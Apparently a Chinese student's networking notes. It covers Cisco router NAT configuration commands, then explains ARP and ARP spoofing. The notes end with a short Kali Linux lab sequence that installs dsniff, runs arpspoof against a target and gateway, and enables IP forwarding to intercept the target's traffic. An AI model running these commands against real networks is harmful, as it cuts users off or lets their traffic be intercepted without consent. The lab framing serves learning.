NAT Network Address Translation 网络地址转换：

IPv4 —> IPv6 过渡技术
①隧道技术
②双栈技术

内网通 外网通 做NAT

①定义内外网接口
Router(config)#int f 0/0
Router(config-if)#ip nat outside – 定义该接口为外接口
Router(config-if)#exit
Router(config)#int f 0/1
Router(config-if)#ip nat inside – 定义该接口为内接口
②匹配感兴趣流量 上网流量
ACL Access Control List 访问控制列表
作用：进行流量的匹配
Router(config)#access-list 1 permit 192.168.10.0 0.0.0.255(后面是反掩码）
③做转换
Router(config)#ip nat inside source list 1 interface f 0/0 overload
将来自内部的，跟列表1相互匹配的源流量在外接口f0/0做地址转换，将私有地址转换成公有地址，实现
上网。overload代表多对一上网。
④写去往全世界的路由
Router(config)#ip route 0.0.0.0 0.0.0.0 200.100.1.1 — 去往任意目的地，交给运营商转发

Router#show ip nat translations – 查看地址转换表
Inside global 被转换后的地址
Inside local 原地址

二层通信：
同一交换机下的两台电脑：张三（192.138.1.3 3A-3B-3C），李四（192.168.1.4 4A-4B-4C）
张三向李四发送数据包：
源IP地址：192.138.1.3
目的IP地址：192.168.1.4
源MAC地址：3A-3B-3C
目的MAC地址：未知，于是在ARP缓存表中查询192.168.1.4对应的MAC地址，如果没找到则为广播地址FF-FF-FF

而ARP欺骗则是伪装为该数据包的目的IP地址，然后将自己的MAC地址告诉他，如果攻击成功，则对方的ARP缓存表会将自己的MAC地址替换原本的目的IP地址对应的MAC地址


+ `apt-get update` --- 更新源
+ `apt-get install dsniff` --- 下载ARP攻击所需要的组件
+ `arpspoof -i eth0 -t 192.168.11.128 -r 192.168.11.2` --- 进行ARP攻击(靶机会把kali误认为是自己的网关 最终实现断网 `arpspoof -i [本机网卡名称] -t [靶机IP] -r [当前网段的网关IP]` )
+ `echo '1' > /proc/sys/net/ipv4/ip_forward` --- 在kali上开启路由转发(让靶机能上网)
